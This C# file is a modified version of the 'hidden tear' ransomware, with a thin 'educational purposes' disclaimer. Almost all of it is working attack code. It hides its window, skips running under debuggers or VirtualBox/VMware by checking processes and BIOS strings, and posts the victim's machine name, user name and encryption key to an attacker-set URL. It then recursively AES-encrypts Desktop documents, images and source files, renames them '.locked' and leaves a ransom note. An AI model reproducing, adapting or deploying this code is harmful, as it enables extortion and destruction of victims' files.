/*
 ___  ___  ___  ________  ________  _______   ________           ________              _________  _______   ________  ________     
|\  \|\  \|\  \|\   ___ \|\   ___ \|\  ___ \ |\   ___  \        |\   ___ \            |\___   ___\\  ___ \ |\   __  \|\   __  \    
\ \  \\\  \ \  \ \  \_|\ \ \  \_|\ \ \   __/|\ \  \\ \  \       \ \  \_|\ \           \|___ \  \_\ \   __/|\ \  \|\  \ \  \|\  \   
 \ \   __  \ \  \ \  \ \\ \ \  \ \\ \ \  \_|/_\ \  \\ \  \       \ \  \ \\ \               \ \  \ \ \  \_|/_\ \   __  \ \   _  _\  
  \ \  \ \  \ \  \ \  \_\\ \ \  \_\\ \ \  \_|\ \ \  \\ \  \       \ \  \_\\ \ ___           \ \  \ \ \  \_|\ \ \  \ \  \ \  \\  \| 
   \ \__\ \__\ \__\ \_______\ \_______\ \_______\ \__\\ \__\       \ \_______\\__\           \ \__\ \ \_______\ \__\ \__\ \__\\ _\ 
    \|__|\|__|\|__|\|_______|\|_______|\|_______|\|__| \|__|        \|_______\|__|            \|__|  \|_______|\|__|\|__|\|__|\|__|
                                                                                                                                   
                                                                                                                                   
                                                                                                                                     
 
 * Coded by Utku Sen(Jani) / August 2015 Istanbul / utkusen.com && Edited by R3dy(Paul Viard) / February 2025 ??? / r3dy.com
 * hidden tear may be used only for Educational Purposes. Do not use it as a ransomware!
 * You could go to jail on obstruction of justice charges just for running hidden tear, even though you are innocent.
 * 
 * Ve durdu saatler 
 * Susuyor seni zaman
 * Sesin dondu kulagimda
 * Dedi uykudan uyan
 * 
 * Yine boyle bir aksamdi
 * Sen guluyordun ya gozlerimin icine 
 * Feslegenler boy vermisti
 * Gokten parlak bir yildiz dustu pesine
 * Sakladim gozyaslarimi
 */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Text.Json;
using System.Net.Http;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;


namespace hidden_tear
{
    public partial class Form1 : Form
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int GetSystemFirmwareTable(uint FirmwareTableProviderSignature, uint FirmwareTableID, byte[] pFirmwareTableBuffer, int BufferSize);

        string targetURL = "CHANGE_HERE";
        string userName = Environment.UserName;
        string computerName = System.Environment.MachineName.ToString();
        string userDir = "C:\\Users\\";
        const uint RSMB = 0x52534D42;


        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Opacity = 0;
            this.ShowInTaskbar = false;


            startAction();
            System.Windows.Forms.Application.Exit();

        }

        private void Form_Shown(object sender, EventArgs e)
        { 
            Visible = false;
            Opacity = 100;
        }


        public byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
        {
            byte[] encryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }


        public string CreatePassword(int length)
        {
            const string valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
            StringBuilder res = new StringBuilder();
            Random rnd = new Random();
            while (0 < length--)
            {
                res.Append(valid[rnd.Next(valid.Length)]);
            }
            return res.ToString();
        }

        public async Task SendPassword(string password, string compassword)
        {
            using (HttpClient client = new HttpClient())
            {
                string info = computerName + "-" + userName + " " + password;
                var values = new Dictionary<string, string>
                {
                    {"computerName", computerName },
                    {"userName", userName },
                    {"password", password }
                };
                string json = JsonSerializer.Serialize(values);
                byte[] jsonValuesEncoded = Encoding.UTF8.GetBytes(json);
                byte[] passwordEncoded = Encoding.UTF8.GetBytes(compassword);

                byte[] bytesEncrypted = AES_Encrypt(jsonValuesEncoded, passwordEncoded);
                var content = new FormUrlEncodedContent(new Dictionary<string, string>
                {
                    { "files", Convert.ToBase64String(bytesEncrypted) }
                });

                try
                {
                    var response = await client.PostAsync(targetURL, content);

                    if (response.IsSuccessStatusCode)
                    {
                        var responseString = await response.Content.ReadAsStringAsync();
                    }
                }
                catch (Exception ex)
                {

                }

            }
        }


        //Encrypts single file
        public void EncryptFile(string file, string password)
        {

            try
            {
                if (!File.Exists(file + ".locked"))
                {
                    byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
                    byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

                    // Hash the password with SHA256
                    passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

                    byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, passwordBytes);

                    File.WriteAllBytes(file, bytesEncrypted);
                    System.IO.File.Move(file, file + ".locked");
                }
            }
            catch (IOException ex)
            {
                //
            }
        }
        public bool watchdog()
        {
            try
            {
                Process[] allProcessOnLocalMachine = Process.GetProcesses();
                foreach (Process process in allProcessOnLocalMachine)
                {

                    bool VboxService = process.ProcessName.IndexOf("Vbox", StringComparison.OrdinalIgnoreCase) >= 0;
                    if (VboxService)
                    {
                        return true;
                    }
                }

            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            return false;
        }
        public bool watchdogs2()
        {
            int size = GetSystemFirmwareTable(RSMB, 0, null, 0);
            if (size == 0)
            {

                return false;
            }

            byte[] buffer = new byte[size];

            int bytesRead = GetSystemFirmwareTable(RSMB, 0, buffer, size);
            if (bytesRead == 0)
            {

                return false;
            }

            string biosInfo = Encoding.ASCII.GetString(buffer);
            biosInfo = Regex.Replace(biosInfo, @"[^\x20-\x7E]+", " ");
            Match manufacturerMatch = Regex.Match(biosInfo, @"(Oracle Corporation|innotek GmbH|VMware, Inc.|Hewlett-Packard|Dell Inc.)");// Maybe Base64 obfuscatation here 
            Match softwareMatch = Regex.Match(biosInfo, @"VirtualBox|Virtual|vbox*");
            if (manufacturerMatch.Success || softwareMatch.Success)
            {
                return true;
            }
            return false;
        }
        //encrypts target directory
        public void encryptDirectory(string location, string password)
        {

            //extensions to be encrypt
            var validExtensions = new[]
            {
                ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd"
            };

            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                string extension = Path.GetExtension(files[i]);
                if (validExtensions.Contains(extension))
                {
                    EncryptFile(files[i], password);
                }
            }
            for (int i = 0; i < childDirectories.Length; i++)
            {
                encryptDirectory(childDirectories[i], password);
            }


        }

        public string createpwd()
        {
            string ze1 = "TXkh";
            string zr1 = "3JDQG";
            string zq1 = "U3VwM";
            string zdff1 = "Mc!";
            string ze1zefea = "1LZXlA";
            string r = ze1 + zq1 + zr1 + ze1zefea;
            string a = r + "final";
            string mpl = zdff1 + ze1zefea + ze1 + zr1;
            string m = a + r;
            return r;

        }

        public int startAction()
        {
            bool isDebuggerPresent = false;
            if (CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent))
            {
                return 0;
            }
            string password = CreatePassword(15);
            string path = "\\Desktop";
            string startPath = userDir + userName + path;

            string compassword = System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String(createpwd()));
            if (watchdog()) return 0;
            SendPassword(password, compassword);
            if (watchdogs2()) return 0;
            encryptDirectory(startPath, password);
            messageCreator();
            password = null;

            return 0;
        }

        public void messageCreator()
        {
            string path = "\\Desktop\\READ_IT.txt";
            string fullpath = userDir + userName + path;
            string[] lines = { "Files has been encrypted with hidden-d-tear", "Send me some something", "https://github.com/r3dy-malz/Hidden-D-Tear" };
            System.IO.File.WriteAllLines(fullpath, lines);
        }
    }
}
